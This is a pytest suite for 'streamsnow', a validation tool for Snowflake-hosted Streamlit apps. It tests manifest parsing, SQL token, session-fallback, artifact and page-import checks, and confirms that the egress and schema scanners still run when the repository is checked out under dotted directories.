    (tmp_path / "apps/pmal-app/pyproject.toml").write_text(
        '[project]\nname = "pmal-app"\nrequires-python = "not-a-version"\n'
        'dependencies = ["streamlit==1.50.0", "snowflake-snowpark-python"]\n'
    )
    by_name, _ = _manifest(tmp_path / "apps/pmal-app")
    assert by_name["manifest"]["ok"] is False
    assert any("requires-python" in p for p in by_name["manifest"]["findings"])


def test_manifest_container_pyproject_invalid_toml_fails(tmp_path):
    cfg = _cfg()
    scaffold(cfg, tmp_path, "ppt-app")
    (tmp_path / "apps/ppt-app/pyproject.toml").write_text("[project\nname = nope\n")
    by_name, _ = _manifest(tmp_path / "apps/ppt-app")
    assert by_name["manifest"]["ok"] is False
    assert any("invalid TOML" in p for p in by_name["manifest"]["findings"])


def test_validate_app_passes_on_warehouse_scaffold(tmp_path):
    # The warehouse scaffold's environment.yml must satisfy the content validation.
    cfg = _warehouse_cfg()
    scaffold(cfg, tmp_path, "wh-ok-app")
    policy = SchemaPolicy.from_governance(cfg.governance)
    res = validate_app(tmp_path / "apps/wh-ok-app", policy, cfg)
    assert res["ok"], res["checks"]


def test_manifest_warehouse_env_yml_missing_dep_fails(tmp_path):
    cfg = _warehouse_cfg()
    scaffold(cfg, tmp_path, "wdep-app")
    env = tmp_path / "apps/wdep-app/environment.yml"
    edata = yaml.safe_load(env.read_text())
    edata["dependencies"] = [
        d for d in edata["dependencies"] if not str(d).startswith("snowflake-snowpark-python")
    ]
    env.write_text(yaml.safe_dump(edata))
    policy = SchemaPolicy.from_governance(cfg.governance)
    res = validate_app(tmp_path / "apps/wdep-app", policy, cfg)
    by_name = {c["name"]: c for c in res["checks"]}
    assert by_name["manifest"]["ok"] is False
    assert any("snowflake-snowpark-python" in p for p in by_name["manifest"]["findings"])


def test_manifest_warehouse_env_yml_operator_deps_pass(tmp_path):
    # Conda deps with operators ('streamlit>=1.50') must be recognized — a naive
    # split on '=' reads 'streamlit>' and would wrongly report streamlit missing.
    cfg = _warehouse_cfg()
    scaffold(cfg, tmp_path, "wop-app")
    (tmp_path / "apps/wop-app/environment.yml").write_text(
        "name: sf_env\nchannels:\n  - snowflake\ndependencies:\n"
        "  - streamlit>=1.50\n  - snowflake-snowpark-python\n  - pandas\n"
    )
    policy = SchemaPolicy.from_governance(cfg.governance)
    res = validate_app(tmp_path / "apps/wop-app", policy, cfg)
    by_name = {c["name"]: c for c in res["checks"]}
    assert by_name["manifest"]["ok"] is True, by_name["manifest"]["findings"]


def test_manifest_warehouse_env_yml_noncanonical_dep_name_ok(tmp_path):
    # PEP 503 normalization applies to conda deps too.
    cfg = _warehouse_cfg()
    scaffold(cfg, tmp_path, "wuc-app")
    (tmp_path / "apps/wuc-app/environment.yml").write_text(
        "name: sf_env\nchannels:\n  - snowflake\ndependencies:\n"
        "  - streamlit=1.50.0\n  - snowflake_snowpark_python\n"
    )
    policy = SchemaPolicy.from_governance(cfg.governance)
    res = validate_app(tmp_path / "apps/wuc-app", policy, cfg)
    by_name = {c["name"]: c for c in res["checks"]}
    assert by_name["manifest"]["ok"] is True, by_name["manifest"]["findings"]


def test_format_finding_renders_dicts_readably():
    from streamsnow.tools.validate_app import _format_finding

    assert (
        _format_finding({"file": "apps/x/q.sql", "line": 12, "schema": "RAW"})
        == "apps/x/q.sql:12 — RAW"
    )
    assert (
        _format_finding({"file": "apps/x/p.py", "line": 3, "kind": "egress", "detail": "requests"})
        == "apps/x/p.py:3 — egress requests"
    )
    assert _format_finding("snowflake.yml missing") == "snowflake.yml missing"
    # No raw dict repr should ever leak through.
    rendered = _format_finding({"file": "f", "line": 1, "func": "load", "detail": "missing cache"})
    assert "{" not in rendered


# --------------------------------------------------------------------------- #
# sql-tokens: {TOKEN} placeholders inside SQL comments                         #
# --------------------------------------------------------------------------- #


def test_sql_tokens_flags_token_in_line_comment(tmp_path):
    p = _write(
        tmp_path / "q.sql",
        "-- Filter applied: {AGENT_FILTER}\nSELECT 1 FROM t WHERE {AGENT_FILTER}\n",
    )
    res = check_sql_tokens.scan_paths([p])
    assert not res["ok"]
    # Only the comment occurrence is flagged; the live-SQL one on line 2 is the
    # legitimate substitution site.
    assert res["findings"] == [{"file": str(p), "line": 1, "token": "{AGENT_FILTER}"}]


def test_sql_tokens_flags_token_in_block_comment(tmp_path):
    p = _write(
        tmp_path / "q.sql",
        "/* This query uses\n   {DATE_FILTER} for pruning */\nSELECT 1\n",
    )
    res = check_sql_tokens.scan_paths([p])
    assert not res["ok"]
    assert res["findings"][0]["line"] == 2


def test_sql_tokens_ignores_live_sql_and_string_literals(tmp_path):
    p = _write(
        tmp_path / "q.sql",
        "SELECT 1 FROM t WHERE {STATUS_FILTER} AND note = '-- {NOT_A_COMMENT}'\n",
    )
    assert check_sql_tokens.scan_paths([p])["ok"]


def test_sql_tokens_ignores_scaffold_header_convention(tmp_path):
    # The scaffold's header block documents params braceless — must stay clean.
    p = _write(
        tmp_path / "q.sql",
        "-- Query: example_metric\n-- Params: :1 start_date, :2 end_date\n"
        "-- Tokens: STATUS_FILTER (braceless by convention)\nSELECT 1\n",
    )
    assert check_sql_tokens.scan_paths([p])["ok"]


def test_sql_tokens_noqa_waiver(tmp_path):
    p = _write(
        tmp_path / "q.sql",
        "-- Expands {AGENT_FILTER} here  -- noqa: sql-token\nSELECT 1\n",
    )
    assert check_sql_tokens.scan_paths([p])["ok"]


def test_sql_tokens_lowercase_and_numeric_braces_not_flagged(tmp_path):
    # RLIKE quantifiers ({2}) and lowercase jinja-ish braces are not render_sql tokens.
    p = _write(
        tmp_path / "q.sql",
        "-- matches ^\\d{2}/\\d{2}$ and {not_a_token}\nSELECT 1\n",
    )
    assert check_sql_tokens.scan_paths([p])["ok"]


def test_validate_app_includes_sql_tokens_check(tmp_path):
    cfg = _cfg()
    scaffold(cfg, tmp_path, "tok-app")
    _write(
        tmp_path / "apps/tok-app/queries/bad.sql",
        "-- Optional filter: {STATUS_FILTER}\nSELECT 1\n",
    )
    policy = SchemaPolicy.from_governance(cfg.governance)
    res = validate_app(tmp_path / "apps/tok-app", policy, cfg)
    by_name = {c["name"]: c for c in res["checks"]}
    assert by_name["sql-tokens"]["ok"] is False


# --------------------------------------------------------------------------- #
# session-fallback: broad try/except around get_active_session()               #
# --------------------------------------------------------------------------- #


def test_session_fallback_accepts_scaffold_shape(tmp_path):
    # The exact warehouse-scaffold pattern must pass verbatim.
    p = _write(
        tmp_path / "page.py",
        "import streamlit as st\n"
        "def load():\n"
        "    try:\n"
        "        from snowflake.snowpark.context import get_active_session\n"
        "        session = get_active_session()\n"
        "    except Exception:\n"
        "        session = st.connection('snowflake').session()\n"
        "    return session\n",
    )
    assert check_session_fallback.scan_paths([p])["ok"]


def test_session_fallback_flags_unwrapped_call(tmp_path):
    p = _write(
        tmp_path / "page.py",
        "from snowflake.snowpark.context import get_active_session\n"
        "session = get_active_session()\n",
    )
    res = check_session_fallback.scan_paths([p])
    assert not res["ok"]
    assert "unwrapped" in res["findings"][0]["detail"]


def test_session_fallback_flags_narrow_except(tmp_path):
    p = _write(
        tmp_path / "page.py",
        "import streamlit as st\n"
        "try:\n"
        "    from snowflake.snowpark.context import get_active_session\n"
        "    session = get_active_session()\n"
        "except ImportError:\n"
        "    session = st.connection('snowflake').session()\n",
    )
    res = check_session_fallback.scan_paths([p])
    assert not res["ok"]
    assert "narrow" in res["findings"][0]["detail"]


def test_session_fallback_accepts_exception_in_tuple(tmp_path):
    p = _write(
        tmp_path / "page.py",
        "try:\n"
        "    session = get_active_session()\n"
        "except (ImportError, Exception):\n"
        "    session = None\n",
    )
    assert check_session_fallback.scan_paths([p])["ok"]


def test_session_fallback_accepts_bare_except(tmp_path):
    p = _write(
        tmp_path / "page.py",
        "try:\n    session = get_active_session()\nexcept:\n    session = None\n",
    )
    assert check_session_fallback.scan_paths([p])["ok"]


def test_session_fallback_call_in_handler_not_covered(tmp_path):
    # A call inside the EXCEPT block is not protected by that try's handlers.
    p = _write(
        tmp_path / "page.py",
        "try:\n    x = 1\nexcept Exception:\n    session = get_active_session()\n",
    )
    assert not check_session_fallback.scan_paths([p])["ok"]


def test_session_fallback_nested_function_inside_try(tmp_path):
    # The try wraps a nested def — coverage follows AST containment.
    p = _write(
        tmp_path / "page.py",
        "def outer():\n"
        "    try:\n"
        "        def inner():\n"
        "            return get_active_session()\n"
        "        return inner()\n"
        "    except Exception:\n"
        "        return None\n",
    )
    assert check_session_fallback.scan_paths([p])["ok"]


def test_session_fallback_noqa_waiver(tmp_path):
    p = _write(
        tmp_path / "page.py",
        "session = get_active_session()  # noqa: session-fallback\n",
    )
    assert check_session_fallback.scan_paths([p])["ok"]


def test_session_fallback_container_scaffold_clean(tmp_path):
    # Container pages use st.connection only — nothing to flag.
    p = _write(
        tmp_path / "page.py",
        "import streamlit as st\nconn = st.connection('snowflake')\n",
    )
    assert check_session_fallback.scan_paths([p])["ok"]


def test_validate_app_includes_session_fallback_check(tmp_path):
    cfg = _warehouse_cfg()
    scaffold(cfg, tmp_path, "sf-app")
    _write(
        tmp_path / "apps/sf-app/pages/bad.py",
        "from snowflake.snowpark.context import get_active_session\ns = get_active_session()\n",
    )
    policy = SchemaPolicy.from_governance(cfg.governance)
    res = validate_app(tmp_path / "apps/sf-app", policy, cfg)
    by_name = {c["name"]: c for c in res["checks"]}
    assert by_name["session-fallback"]["ok"] is False


# --------------------------------------------------------------------------- #
# artifacts: snowflake.yml artifacts list vs files on disk                     #
# --------------------------------------------------------------------------- #


def test_artifacts_scaffold_is_clean(tmp_path):
    cfg = _cfg()
    scaffold(cfg, tmp_path, "art-app")
    assert check_artifacts.check_app(tmp_path / "apps/art-app")["ok"]


def test_artifacts_flags_uncovered_new_file(tmp_path):
    cfg = _cfg()
    scaffold(cfg, tmp_path, "art-app")
    app = tmp_path / "apps/art-app"
    # A new top-level helper module the manifest never learned about.
    _write(app / "helpers.py", "X = 1\n")
    res = check_artifacts.check_app(app)
    assert not res["ok"]
    assert any("helpers.py" in f["detail"] for f in res["findings"])


def test_artifacts_directory_entry_covers_new_files(tmp_path):
    cfg = _cfg()
    scaffold(cfg, tmp_path, "art-app")
    app = tmp_path / "apps/art-app"
    # queries/ and pages/ are directory entries in the scaffold manifest.
    _write(app / "queries/new_metric.sql", "SELECT 1\n")
    _write(app / "pages/trends.py", "import streamlit as st\n")
    assert check_artifacts.check_app(app)["ok"]


def test_artifacts_flags_stale_entry(tmp_path):
    cfg = _cfg()
    scaffold(cfg, tmp_path, "art-app")
    app = tmp_path / "apps/art-app"
    (app / "branding.py").unlink()
    res = check_artifacts.check_app(app)
    assert not res["ok"]
    assert any("branding.py" in f["detail"] and "stale" in f["detail"] for f in res["findings"])


def test_artifacts_no_key_passes(tmp_path):
    cfg = _cfg()
    scaffold(cfg, tmp_path, "art-app")
    app = tmp_path / "apps/art-app"
    yml = app / "snowflake.yml"
    data = yaml.safe_load(yml.read_text())
    for ent in data["entities"].values():
        ent.pop("artifacts", None)
    yml.write_text(yaml.safe_dump(data))
    _write(app / "helpers.py", "X = 1\n")  # would fail if the list were present
    assert check_artifacts.check_app(app)["ok"]


def test_artifacts_markdown_and_secrets_not_demanded(tmp_path):
    cfg = _cfg()
    scaffold(cfg, tmp_path, "art-app")
    app = tmp_path / "apps/art-app"
    # AGENTS.md is a required file but never an artifact; secrets stay local.
    assert (app / "AGENTS.md").is_file()
    assert (app / ".streamlit/secrets.toml.example").is_file()
    assert check_artifacts.check_app(app)["ok"]


def test_artifacts_glob_entry_supported(tmp_path):
    cfg = _cfg()
    scaffold(cfg, tmp_path, "art-app")
    app = tmp_path / "apps/art-app"
    yml = app / "snowflake.yml"
    data = yaml.safe_load(yml.read_text())
    for ent in data["entities"].values():
        if "artifacts" in ent:
            ent["artifacts"] = [e for e in ent["artifacts"] if e != "queries/"] + ["queries/*.sql"]
    yml.write_text(yaml.safe_dump(data))
    _write(app / "queries/extra.sql", "SELECT 1\n")
    assert check_artifacts.check_app(app)["ok"]


def test_artifacts_scan_paths_maps_files_to_app_root(tmp_path):
    cfg = _cfg()
    scaffold(cfg, tmp_path, "art-app")
    app = tmp_path / "apps/art-app"
    _write(app / "helpers.py", "X = 1\n")
    # Pre-commit passes individual filenames; the scan must find the app root.
    res = check_artifacts.scan_paths([app / "helpers.py"])
    assert not res["ok"]


def test_validate_app_includes_artifacts_check(tmp_path):
    cfg = _cfg()
    scaffold(cfg, tmp_path, "art-app")
    _write(tmp_path / "apps/art-app/helpers.py", "X = 1\n")
    policy = SchemaPolicy.from_governance(cfg.governance)
    res = validate_app(tmp_path / "apps/art-app", policy, cfg)
    by_name = {c["name"]: c for c in res["checks"]}
    assert by_name["artifacts"]["ok"] is False


# --------------------------------------------------------------------------- #
# page-imports: sys.path differs between `streamlit run` and the deployed app  #
# --------------------------------------------------------------------------- #

# The marker phrase that must appear ONLY on findings a local run cannot catch.
_LOCAL_BLIND = "full UI walkthrough"


def _app(tmp_path: Path) -> Path:
    """Minimal app root: entrypoint, two app-root helpers, and a pages/ helper.

    ``snowflake.yml`` is the app-root marker ``scan_paths`` keys on; ``check_app``
    takes the root directly and does not need it.
    """
    root = tmp_path / "apps" / "demo"
    _write(root / "snowflake.yml", "definition_version: 2\n")
    _write(root / "streamlit_app.py", "import streamlit as st\n")
    _write(root / "branding.py", "BRAND = 1\n")
    _write(root / "sql_loader.py", "def load_sql(n): ...\n")
    _write(root / "pages" / "_helper.py", "def go(): ...\n")
    return root


def _page(root: Path, body: str, name: str = "thing.py") -> Path:
    return _write(root / "pages" / name, body)


def _details(root: Path) -> list[str]:
    return [f["detail"] for f in check_page_imports.check_app(root)["findings"]]


def test_page_imports_flags_the_bare_sibling_regression(tmp_path):
    # The exact production break: a helper that lives only in pages/, imported bare.
    root = _app(tmp_path)
    _page(root, "from _helper import go\n")
    findings = check_page_imports.check_app(root)["findings"]
    assert len(findings) == 1
    assert findings[0]["line"] == 1
    assert "pages/thing.py" in findings[0]["file"]
    assert "pages._helper" in findings[0]["detail"]  # message names the fix
    assert _LOCAL_BLIND in findings[0]["detail"]  # and says local testing can't see it


def test_page_imports_package_qualified_is_clean(tmp_path):
    root = _app(tmp_path)
    _page(root, "from pages._helper import go\n")
    assert check_page_imports.check_app(root)["ok"]


def test_page_imports_app_root_modules_never_flagged(tmp_path):
    # Guards the scaffold: pages/overview.py imports branding + sql_loader bare, and
    # the app root IS on sys.path deployed, so both are correct.
    root = _app(tmp_path)
    _page(root, "from branding import BRAND\nimport sql_loader\n")
    assert check_page_imports.check_app(root)["ok"]


def test_page_imports_relative_and_dotted_out_of_scope(tmp_path):
    root = _app(tmp_path)
    _page(root, "from ._helper import go\nfrom pages._helper import go as g2\n")
    assert check_page_imports.check_app(root)["ok"]


def test_page_imports_plain_import_form_flagged(tmp_path):
    root = _app(tmp_path)
    _page(root, "import _helper\n")
    assert len(_details(root)) == 1


def test_page_imports_entrypoint_importing_a_pages_module_is_loud_not_silent(tmp_path):
    # pages/ is not the entrypoint's own directory, so this fails locally too — the
    # message must not claim a local run would miss it.
    root = _app(tmp_path)
    _write(root / "streamlit_app.py", "from _helper import go\n")
    details = _details(root)
    assert len(details) == 1
    assert "pages._helper" in details[0]
    assert _LOCAL_BLIND not in details[0]


def test_page_imports_same_dir_collision_is_ambiguous(tmp_path):
    # Root wins deployed, pages/ wins under `streamlit run` — the page silently runs
    # different code in each environment. Same failure family, so it is a finding.
    root = _app(tmp_path)
    _write(root / "pages" / "branding.py", "BRAND = 2\n")
    _page(root, "from branding import BRAND\n")
    details = _details(root)
    assert len(details) == 1
    assert "ambiguous" in details[0]
    assert "pages.branding" in details[0]


def test_page_imports_other_subdir_collision_is_clean(tmp_path):
    # lib/ is never on sys.path in EITHER environment, so there is no divergence.
    root = _app(tmp_path)
    _write(root / "lib" / "branding.py", "BRAND = 2\n")
    _page(root, "from branding import BRAND\n")
    assert check_page_imports.check_app(root)["ok"]


def test_page_imports_stdlib_shadowed_in_own_dir_is_ambiguous(tmp_path):
    root = _app(tmp_path)
    _write(root / "pages" / "json.py", "X = 1\n")
    _page(root, "import json\n")
    details = _details(root)
    assert len(details) == 1
    assert "standard-library" in details[0]


def test_page_imports_stdlib_in_other_subdir_is_clean(tmp_path):
    root = _app(tmp_path)
    _write(root / "lib" / "json.py", "X = 1\n")
    _page(root, "import json\n")
    assert check_page_imports.check_app(root)["ok"]


def test_page_imports_declared_dependency_in_other_subdir_is_clean(tmp_path):
    root = _app(tmp_path)
    _write(
        root / "pyproject.toml",
        '[project]\nname = "demo"\ndependencies = ["plotly>=5", "streamlit"]\n',
    )
    _write(root / "lib" / "plotly.py", "X = 1\n")
    _page(root, "import plotly\n")
    assert check_page_imports.check_app(root)["ok"]


def test_page_imports_nested_helper_gets_the_full_dotted_fix(tmp_path):
    # st.navigation takes page paths, so pages/admin/ is a legitimate layout.
    root = _app(tmp_path)
    _write(root / "pages" / "admin" / "_hdr.py", "def go(): ...\n")
    _write(root / "pages" / "admin" / "report.py", "from _hdr import go\n")
    details = _details(root)
    assert len(details) == 1
    assert "pages.admin._hdr" in details[0]
    assert _LOCAL_BLIND in details[0]


def test_page_imports_noqa_suppresses(tmp_path):
    root = _app(tmp_path)
    _page(root, "from _helper import go  # noqa: page-imports\n")
    assert check_page_imports.check_app(root)["ok"]


def test_page_imports_noqa_on_a_multiline_import(tmp_path):
    root = _app(tmp_path)
    _page(root, "from _helper import (  # noqa: page-imports\n    go,\n)\n")
    assert check_page_imports.check_app(root)["ok"]


def test_page_imports_syntax_error_is_left_to_ruff(tmp_path):
    root = _app(tmp_path)
    _page(root, "def broken(\n")
    assert check_page_imports.check_app(root)["ok"]


def test_page_imports_scan_paths_widens_to_the_whole_app(tmp_path):
    # Pre-commit passes only the CHANGED files. Adding pages/_helper.py makes an
    # untouched sibling newly-violating, and the hook never sees that sibling.
    root = _app(tmp_path)
    _page(root, "from _helper import go\n")
    res = check_page_imports.scan_paths([root / "pages" / "_helper.py"])
    assert not res["ok"]
    assert "pages/thing.py" in res["findings"][0]["file"]


def test_page_imports_scan_paths_skips_a_file_with_no_app_root(tmp_path):
    other = _write(tmp_path / "tools" / "x.py", "from _helper import go\n")
    assert check_page_imports.scan_paths([other])["ok"]


def test_page_imports_survives_malformed_manifests(tmp_path):
    # validate_app deliberately routes parse errors to the `manifest` check; this one
    # must degrade to "no declared deps", never traceback and take down the aggregate.
    root = _app(tmp_path)
    _write(root / "pyproject.toml", "[project\nname = nope\n")
    _write(root / "environment.yml", "name: [unclosed\n")
    _page(root, "from pages._helper import go\n")
    assert check_page_imports.check_app(root)["ok"]


def test_page_imports_exit_codes(tmp_path, capsys, monkeypatch):
    monkeypatch.chdir(tmp_path)
    root = _app(tmp_path)
    _page(root, "from pages._helper import go\n")
    assert check_page_imports.main([str(root)]) == 0
    assert "page-imports: clean" in capsys.readouterr().out

    _page(root, "from _helper import go\n")
    assert check_page_imports.main([str(root)]) == 1
    assert "ModuleNotFoundError" in capsys.readouterr().out


def test_page_imports_cli_command_runs(tmp_path, monkeypatch):
    """`streamsnow check page-imports` — the entry the generated pre-commit hook calls."""
    from typer.testing import CliRunner

    from streamsnow.cli import app as cli_app

    monkeypatch.chdir(tmp_path)
    root = _app(tmp_path)
    _page(root, "from _helper import go\n")
    result = CliRunner().invoke(cli_app, ["check", "page-imports", "apps"])
    assert result.exit_code == 1, result.output
    assert "pages/thing.py" in result.output

    _page(root, "from pages._helper import go\n")
    result = CliRunner().invoke(cli_app, ["check", "page-imports", "apps"])
    assert result.exit_code == 0, result.output


def test_validate_app_includes_page_imports_check(tmp_path):
    cfg = _cfg()
    scaffold(cfg, tmp_path, "pi-app")
    _write(tmp_path / "apps/pi-app/pages/_hdr.py", "def go(): ...\n")
    _write(tmp_path / "apps/pi-app/pages/broken.py", "from _hdr import go\n")
    policy = SchemaPolicy.from_governance(cfg.governance)
    res = validate_app(tmp_path / "apps/pi-app", policy, cfg)
    by_name = {c["name"]: c for c in res["checks"]}
    assert by_name["page-imports"]["ok"] is False


def test_scaffolded_pages_helper_imports_without_an_init_file(tmp_path, monkeypatch):
    """The fix form works with no ``pages/__init__.py`` — observed, not argued.

    PEP 420 makes ``pages`` an implicit namespace package once the app root is on
    sys.path, which is why the scaffold does not ship an ``__init__.py``. The real
    tradeoff: namespace packages MERGE across sys.path entries where a regular package
    would shadow. That is a footnote only because the app root is the sole such entry
    in the Snowflake runtime.

    This proves local Python semantics, not the Snowflake runtime — the honest limit.
    """
    import importlib

    cfg = _cfg()
    scaffold(cfg, tmp_path, "ns-app")
    app_root = tmp_path / "apps/ns-app"
    _write(app_root / "pages" / "_hdr.py", "VALUE = 'loaded'\n")
    assert not (app_root / "pages" / "__init__.py").exists()

    monkeypatch.syspath_prepend(str(app_root))
    for name in ("pages", "pages._hdr"):
        monkeypatch.delitem(sys.modules, name, raising=False)
    assert importlib.import_module("pages._hdr").VALUE == "loaded"


# --------------------------------------------------------------------------- #
# Junk-directory filtering must not depend on where the repo is checked out.
# Filtering on the ABSOLUTE path's components made a checkout under any dotted
# directory (a worktree at `.claude/worktrees/<name>/`) look entirely hidden,
# so these gates scanned NOTHING and reported OK. These had no mutation
# coverage, so reverting the fix left the suite green.
# --------------------------------------------------------------------------- #


_EGRESS = 'import requests\ndef f():\n    requests.get("https://example.invalid/x")\n'
_DENIED = "-- q\nSELECT a FROM DB.BRIDGE.T\n"


@pytest.mark.parametrize("shape", ["plain", ".claude/worktrees/w", "venv"])
def test_app_security_scans_whatever_the_checkout_path_looks_like(tmp_path, shape):
    from streamsnow.tools.check_app_security import _iter_files, scan_paths

    repo = tmp_path / shape / "repo"
    (repo / "apps" / "x").mkdir(parents=True)
    (repo / "apps" / "x" / "bad.py").write_text(_EGRESS)
    res = scan_paths(_iter_files(repo / "apps"), repo / "apps")
    assert len(res["findings"]) == 1, f"scanned nothing under a {shape!r} checkout"


@pytest.mark.parametrize("shape", ["plain", ".claude/worktrees/w", "venv"])
def test_schema_refs_scans_whatever_the_checkout_path_looks_like(tmp_path, shape):
    from streamsnow.policy import SchemaPolicy as SP
    from streamsnow.tools.check_schema_refs import _iter_files, check_paths

    policy = SP(database="DB", schema_allow=("ANALYTICS",), schema_deny=("BRIDGE",))
    repo = tmp_path / shape / "repo"
    (repo / "apps" / "x" / "queries").mkdir(parents=True)
    (repo / "apps" / "x" / "queries" / "q.sql").write_text(_DENIED)
    res = check_paths(_iter_files(repo / "apps"), policy, repo / "apps")
    assert len(res["findings"]) == 1, f"scanned nothing under a {shape!r} checkout"


def test_junk_dirs_inside_the_repo_are_still_skipped(tmp_path):
    """The fix must not turn into 'scan everything'."""
    from streamsnow.tools.check_app_security import _iter_files, scan_paths

    repo = tmp_path / "repo"
    for sub in (".review", ".venv", "__pycache__"):
        (repo / "apps" / "x" / sub).mkdir(parents=True)
        (repo / "apps" / "x" / sub / "junk.py").write_text(_EGRESS)
    (repo / "apps" / "x" / "real.py").write_text(_EGRESS)
    res = scan_paths(_iter_files(repo / "apps"), repo / "apps")
    files = {f["file"] for f in res["findings"]}
    assert len(files) == 1 and any("real.py" in f for f in files), files
